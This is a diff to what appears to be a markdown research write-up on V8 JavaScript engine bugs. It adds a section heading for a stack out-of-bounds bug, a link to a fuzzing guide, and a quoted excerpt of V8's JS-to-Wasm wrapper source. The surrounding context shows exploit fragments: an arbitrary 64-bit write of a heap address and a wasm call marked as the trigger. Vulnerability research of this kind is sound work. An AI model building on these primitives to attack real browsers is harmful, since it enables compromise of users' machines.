@@ -10,6 +10,7 @@
     + [New SSE instructions](#new-sse-instructions)
     + [Solution](#solution)
     + [Reproducing Manfred's bug](#reproducing-manfreds-bug)
+    + [Reproducing Stack OOB bug](#reproducing-stack-oob-bug)
 
 <!-- tocstop -->
 
@@ -1543,6 +1544,9 @@ pwndbg> bt
 #7  0x00007ffff53ca3fc in v8::internal::Runtime_GrowableSharedArrayBufferByteLength(int, unsigned long*, v8::internal::Isolate*) () at ../../src/runtime/runtime-typedarray.cc:67
 ```
 
+- Reading more: https://github.com/TomDeCat2021/sbx/blob/main/fuzzer/README.md#a-how-to-find-0days
+
+
 ### Reproducing Stack OOB bug
 
 
@@ -1626,4 +1630,31 @@ v8_write64(offset_base - 0x20n, heap_addr + 0x200200n); // 000555555A65589      
 
 // trigger
 instance.exports.func1(0x4141n);
+
+// =============================================
+// v8/src/builtins/js-to-wasm.tq:699
+macro JSToWasmWrapperHelper( // in default namespace
+    context: NativeContext, _receiver: JSAny, target: JSFunction,
+    arguments: Arguments, promise: constexpr Promise): never {
+  const functionData =
+      UnsafeCast<WasmExportedFunctionData>(target.shared_function_info.data);
+
+  // The normal return sequence of Torque-generated JavaScript builtins does not
+  // consider the case where the caller may push additional "undefined"
+  // parameters on the stack, and therefore does not generate code to pop these
+  // additional parameters. Here we calculate the actual number of parameters on
+  // the stack. This number is the number of actual parameters provided by the
+  // caller, which is `arguments.length`, or the number of declared arguments,
+  // if not enough actual parameters were provided, i.e.
+  // `SharedFunctionInfo::length`.
+  let popCount = arguments.length;
+  const declaredArgCount =
+      Convert<intptr>(Convert<int32>(target.shared_function_info.length));
+  if (declaredArgCount > popCount) {
+    popCount = declaredArgCount;
+  }
+  // Also pop the receiver.
+  PopAndReturn(popCount + 1, result);
+}
+
 ```
